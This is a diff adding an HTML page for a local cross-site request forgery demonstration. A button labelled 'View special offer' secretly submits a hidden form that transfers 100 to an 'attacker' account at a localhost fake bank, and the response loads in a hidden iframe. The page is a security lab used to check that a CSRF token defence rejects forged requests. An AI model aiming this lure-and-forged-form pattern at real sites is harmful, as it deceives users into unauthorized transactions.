@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Local CSRF Demo - Click Trigger</title>
+  <style>
+    body { font: 16px/1.5 system-ui, sans-serif; max-width: 650px; margin: 60px auto; padding: 0 20px; }
+    button { padding: 12px 18px; border: 0; border-radius: 8px; color: white; background: #24558a; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h1>Demo: Click-triggered forged transfer</h1>
+  <p>In this controlled security demonstration, pressing the button submits a form to the local fake bank.</p>
+  <button id="trigger" type="button">View special offer</button>
+  <p id="status" role="status"></p>
+  <form id="forged-transfer" action="http://localhost:5000/transfer" method="POST" target="result-frame">
+    <input type="hidden" name="receiver" value="attacker">
+    <input type="hidden" name="amount" value="100">
+    <!-- No csrf_token: use to verify secure mode rejects this request. -->
+  </form>
+  <iframe name="result-frame" title="Background transfer response" hidden></iframe>
+  <script>
+    document.getElementById("trigger").addEventListener("click", () => {
+      document.getElementById("forged-transfer").submit();
+      document.getElementById("status").textContent =
+        "Request submitted. Verify whether the bank accepted or rejected it.";
+    });
+  </script>
+</body>
+</html>
